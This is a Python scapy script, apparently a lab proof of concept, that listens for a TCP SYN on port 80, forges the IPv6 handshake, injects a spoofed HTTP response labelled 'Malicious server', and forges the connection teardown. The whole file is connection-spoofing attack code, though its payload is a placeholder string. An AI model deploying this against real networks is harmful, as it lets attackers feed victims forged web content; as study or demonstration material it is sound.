#!/usr/bin/python

from scapy.all import *

print("Listening...")

# recv: SYN
syn = sniff(count=1, filter="tcp and port 80")

# initializing some variables for later use.
sport = syn[0].sport
seq_num = syn[0].seq
ack_num = syn[0].seq + 1
src = syn[0][IPv6].src
dst = syn[0][IPv6].dst
print("IPv6 src: ", src)
print("IPv6 dst: ", dst)

# send: SYN/ACK
eth = Ether(src=syn[0].dst, dst=syn[0].src)
ipv6 = IPv6(src=dst, dst=src)
tcp_synack = TCP(sport=80, dport=sport, flags="SA", seq=seq_num, ack=ack_num, options=[('MSS', 1460)])
sendp(eth/ipv6/tcp_synack, iface="eth0")

# recv: HTTP request
get_request = sniff(filter="tcp and port 80",count=1,prn=lambda x:x.sprintf("{IP:%IP.src%: %TCP.dport%}"))

# send: HTTP response
ack_num = ack_num + len(get_request[0].load)
seq_num = syn[0].seq + 1
html1 = "HTTP/1.1 200 OK\x0d\x0aDate: Wed, 29 Sep 2010 20:19:05 GMT\x0d\x0aServer: Malicious server\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: 17\x0d\x0a\x0d\x0amalicious!!!!!!!\n"
tcp = TCP(sport=80, dport=sport, flags="PA", seq=seq_num, ack=ack_num, options=[('MSS', 1460)])
ack_http = srp1(eth/ipv6/tcp/html1, iface="eth0")

# send: FIN/ACK
seq_num = ack_http.ack
fin = TCP(sport=80, dport=sport, flags="FA", seq=seq_num, ack=ack_num, options=[('MSS', 1460)])
finack = srp1(eth/ipv6/fin, iface="eth0")

# send: ACK
last_ack = TCP(sport=80, dport=sport, flags="A", seq=finack.ack, ack=finack.seq+1)
sendp(eth/ipv6/last_ack, iface="eth0")
